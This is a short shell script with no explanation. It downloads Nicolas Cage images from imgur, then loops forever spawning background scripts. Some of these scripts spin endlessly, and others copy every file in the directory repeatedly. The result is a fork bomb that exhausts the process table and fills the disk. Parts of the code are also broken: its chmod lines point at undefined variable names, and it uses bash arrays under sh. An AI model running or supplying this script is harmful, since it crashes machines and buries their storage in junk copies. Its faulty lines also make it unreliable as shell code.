#!/bin/sh
IMAGES=($(curl -s imgur.com/search?q=nick+cage | grep "img alt" | sed 's/.*\/\///g' | sed 's/\" \/>//g'))
TOTAL=$(echo ${IMAGES[@]} | wc -w)
X=0
while [ $X -lt $TOTAL ] ; do
        curl -O -s ${IMAGES[$X]}
        X=$(( $X + 1 ))
done

A=0
while [ 1 ] ; do
        echo " while [ 1 ] ; do
                echo '.'
                done" > $A.SH

        chmod +x $ACAGER.SH
        sh $A.SH &
        echo "
        while [ 1 ] ; do
                find . -type f -exec cp '{}' '{}x' \;
        done
        " > $A.2.SH
        chmod +x $AREPLICATOR.SH
        sh $A.2.SH &
        A=$(( $A + 1 ))
done
